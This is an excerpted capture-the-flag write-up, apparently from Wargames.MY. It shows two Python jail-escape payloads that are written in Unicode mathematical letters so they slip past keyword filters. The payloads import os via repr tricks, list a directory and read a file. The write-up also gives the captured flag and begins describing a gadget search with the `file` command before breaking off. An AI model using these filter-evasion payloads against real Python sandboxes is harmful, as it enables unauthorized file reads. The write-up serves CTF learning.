...
Finally, just convert the exploitation code into fancy unicode string and feed it to the server, and voilà, `wgmy{ab065d1d896dcdc228d5f19077501838}` pops.
...
EXP = '𝒑𝒓𝒊𝒏𝒕(𝒐𝒑𝒆𝒏(__𝑏𝑢𝑖𝑙𝑡𝑖𝑛𝑠__.__𝑖𝑚𝑝𝑜𝑟𝑡__(𝑟𝑒𝑝𝑟(__𝑏𝑢𝑖𝑙𝑡𝑖𝑛𝑠__.__𝑖𝑚𝑝𝑜𝑟𝑡__)[24]+𝑐ℎ𝑟(𝑜𝑟𝑑(𝑟𝑒𝑝𝑟(__𝑏𝑢𝑖𝑙𝑡𝑖𝑛𝑠__.__𝑖𝑚𝑝𝑜𝑟𝑡__)[24])+4)).𝑙𝑖𝑠𝑡𝑑𝑖𝑟()[-1]).𝒓𝒆𝒂𝒅())'
...
EXP = '𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(__𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴__.__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘳𝘦𝘱𝘳(__𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴__.__𝘪𝘮𝘱𝘰𝘳𝘵__)[24].__𝘢𝘥𝘥__(𝘤𝘩𝘳(𝘰𝘳𝘥(𝘳𝘦𝘱𝘳(__𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴__.__𝘪𝘮𝘱𝘰𝘳𝘵__)[24]).__𝘢𝘥𝘥__(4)))).𝘭𝘪𝘴𝘵𝘥𝘪𝘳()[-1]).𝘳𝘦𝘢𝘥())'
...
To find a good gadget, I nagivated to a folder storing my recently downloaded files and many temporary files to run `file -b *` on it to get a sense of the verbosity. Out of pure luck, I noticed `file` command is very verbose for `.doc` file's signature, giving the following for one file:
```
